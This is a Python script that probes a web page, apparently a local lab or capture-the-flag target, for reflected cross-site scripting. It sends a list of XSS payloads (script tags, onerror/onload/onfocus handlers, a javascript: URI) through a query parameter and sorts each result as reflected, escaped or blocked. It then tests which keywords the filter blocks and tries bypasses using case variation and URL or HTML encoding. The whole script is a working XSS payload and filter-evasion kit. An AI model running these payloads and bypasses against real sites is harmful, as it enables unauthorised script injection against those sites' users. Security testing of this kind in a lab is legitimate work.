import requests
import urllib.parse
import re

url = "http://127.0.0.1:33203/page"

# Test different XSS payloads in increasing complexity
test_payloads = [
    # Basic strings
    ("simple_text", "test123"),
    ("html_tag", "<b>bold</b>"),
    ("html_div", "<div>content</div>"),
    ("html_span", "<span>text</span>"),
    ("html_br", "text<br>more"),
    
    # Script-related
    ("script_tag", "<script>alert(1)</script>"),
    ("script_tag2", "<script>test</script>"),
    ("script_word", "script"),
    ("alert_word", "alert"),
    ("onerror_attr", "<img onerror=1>"),
    ("onload_attr", "<img onload=1>"),
    ("javascript_proto", "javascript:void(0)"),
    
    # Event handlers
    ("onerror_simple", "<img src=x onerror=1>"),
    ("onmouseover", "<div onmouseover=1>"),
    ("onclick", "<div onclick=1>"),
    
    # Obfuscated variations
    ("img_tag", "<img>"),
    ("img_src", "<img src=x>"),
    ("svg_onload", "<svg onload=1>"),
    ("body_onload", "<body onload=1>"),
]

print(f"[+] Testing XSS Payloads - {len(test_payloads)} tests")
print(f"{'='*80}")

results = []

for test_name, payload in test_payloads:
    # Test with URL encoding
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?name={encoded_payload}"
    
    response = requests.get(test_url)
    response_text = response.text
    
    # Check if payload appears in response
    if payload in response_text:
        status = "✓ REFLECTED"
        reflected = True
    else:
        # Try to find HTML-escaped versions
        escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        if escaped_payload in response_text:
            status = "! ESCAPED"
            reflected = "escaped"
        else:
            status = "✗ BLOCKED"
            reflected = False
    
    results.append((test_name, payload, status, reflected))
    print(f"[{status:13}] {test_name:20} - {payload}")

# Summary
print(f"\n{'='*80}")
print(f"[+] Summary:")
blocked = sum(1 for _, _, _, reflected in results if reflected is False)
reflected = sum(1 for _, _, _, reflected in results if reflected is True)
escaped = sum(1 for _, _, _, reflected in results if reflected == "escaped")

print(f"    Total tested: {len(results)}")
print(f"    Blocked: {blocked}")
print(f"    Reflected: {reflected}")
print(f"    Escaped: {escaped}")

# Try to find patterns in what gets blocked
print(f"\n[+] Filter Analysis:")
print(f"    Checking what keywords trigger blocking...")

# Test individual keywords
keywords = ['script', 'onerror', 'alert', 'javascript', 'onload']
keyword_results = {}

for keyword in keywords:
    test_url = f"{url}?name={keyword}"
    response = requests.get(test_url)
    
    if keyword in response.text:
        keyword_results[keyword] = "REFLECTED"
        print(f"    {keyword:15} - REFLECTED")
    else:
        keyword_results[keyword] = "BLOCKED"
        print(f"    {keyword:15} - BLOCKED")

# Based on results, try some bypass techniques
print(f"\n[+] Trying Filter Bypasses:")

bypass_attempts = [
    # Case variations
    ("uppercase_script", "<SCRIPT>alert(1)</SCRIPT>"),
    ("mixed_case", "<ScRiPt>alert(1)</ScRiPt>"),
    
    # HTML encoding
    ("html_encoded", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    
    # Double encoding
    ("double_encoded", "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E"),
    
    # Different event handlers
    ("onfocus", "<input onfocus=alert(1)>"),
    ("onblur", "<input onblur=alert(1)>"),
]

for test_name, payload in bypass_attempts:
    # Use unencoded for some tests
    test_url = f"{url}?name={payload}"
    response = requests.get(test_url)
    response_text = response.text
    
    if payload in response_text:
        status = "✓ BYPASS WORKS"
        print(f"[!] {test_name:20} - {payload}")
    elif '<' in response_text and '>' in response_text:
        # HTML is being reflected but our specific payload isn't
        status = "? PARTIAL"
        print(f"[?] {test_name:20} - HTML tags reflected but payload specifically blocked")
    else:
        status = "✗ NO BYPASS"
        print(f"[-] {test_name:20} - Still blocked")

# Final check - look at actual rendered input field
print(f"\n[+] Checking Input Field Behavior:")
test_url = f"{url}?name=test123"
response = requests.get(test_url)

input_matches = re.findall(r'<input[^>]*>', response.text)
print(f"[+] Input field(s) found: {len(input_matches)}")
for input_tag in input_matches:
    print(f"    {input_tag}")
